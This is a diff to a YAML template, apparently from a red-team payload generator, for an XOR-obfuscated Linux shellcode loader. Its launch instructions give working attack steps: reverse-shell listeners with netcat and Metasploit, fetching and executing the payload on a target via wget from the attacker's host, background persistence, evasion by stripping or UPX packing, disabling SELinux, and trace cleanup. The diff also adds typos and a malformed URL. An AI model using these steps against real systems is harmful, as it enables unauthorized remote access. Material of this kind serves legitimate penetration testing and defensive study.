@@ -1,19 +1,19 @@
 meta:
-  name: "Linux Shellcode Loader, XOR (C)"
+  name: "Linux Shellcode Loader, XOR (C)*"
   category: "Shellcode Execution"
   description: |
     Simple XOR-encrypted shellcode loader for Linux x64 systems.
-    
+
     Features:
     - XOR encryption for basic obfuscation (key: 0xfa)
     - Runtime decryption
     - Direct shellcode execution via function pointer
     - Executable stack required (-z execstack)
     - Minimal footprint
-    
+
     This is a straightforward loader suitable for initial access on Linux targets.
     The executable stack requirement may trigger security warnings on hardened systems.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "low"
@@ -91,40 +91,59 @@ output:
     enabled: true
     command: "gcc -o {{ output_path }}/{{ output_file }} {{ source_file }} -z execstack"
   launch_instructions: |
-    C Linux XOR Shellcode Loader - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ nc -lvnp {{ lport }}
+    ```bash
+    nc -lvnp {{ lport }}
+    ```
 
     Or with Metasploit:
-    $ msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j\"
+    ```
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ wget http://{{ lhost }}/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && /tmp/{{ output_file }}
+    # Transfer and Execute
 
-    Background Execution:
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```bash
+    wget http://{{ lhost }}:/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && /tmp/{{ output_file }}
+    ```
+
+    # Background Execution
+
+    ```bash
     nohup /tmp/{{ output_file }} > /dev/null 2>&1 &
+    ```
 
-    Notes:
-    - XOR encrypted with key: 0x{{ xor_key }}
-    - Requires executable stack (-z execstack linker flag)
+    # Noteses
+
+    - XOR encrypted with key: `0x{{ xor_key }}`
+    - Requires executable stack (`-z execstack` linker flag)
     - Works on x64 Linux systems
     - Minimal evasion (basic XOR only)
     - Executable stack may trigger security warnings on hardened systems
-    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - Reverse shell connects to `{{ lhost }}:{{ lport }}`
     - Consider stripping binary (`strip {{ output_file }}`) or packing with UPX for additional evasion
-    - Alternative payloads: bind shell (msfvenom -p linux/x64/shell_bind_tcp), Meterpreter
+    - Alternative payloads: bind shell (`msfvenom -p linux/x64/shell_bind_tcp`), Meterpreter
 
-    Troubleshooting:
-    - Segmentation fault: Ensure target is x64 Linux; check `uname -m` (should be x86_64)
-    - Permission denied: Run `chmod +x {{ output_file }}`
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - Executable stack warning: Expected behavior; required for shellcode execution
-    - NX bit enabled: Executable stack flag should bypass this
-    - SELinux blocks: Check with `getenforce`; may need to disable or adjust policy
+    # Troubleshooting
 
-    Cleanup:
-    On target:
+    - **Segmentation fault:** Ensure target is x64 Linux; check `uname -m` (should be x86_64)
+    - **Permission denied:** Run `chmod +x {{ output_file }}`
+    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **Executable stack warning:** Expected behavior; required for shellcode execution
+    - **NX bit enabled:** Executable stack flag should bypass this
+    - **SELinux blocks:** Check with `getenforce`; may need to disable or adjust policy
+
+    # Cleanup
+
+    **Target:**
+    ```bash
     pkill -f {{ output_file }}
     rm -f /tmp/{{ output_file }}
+    ```
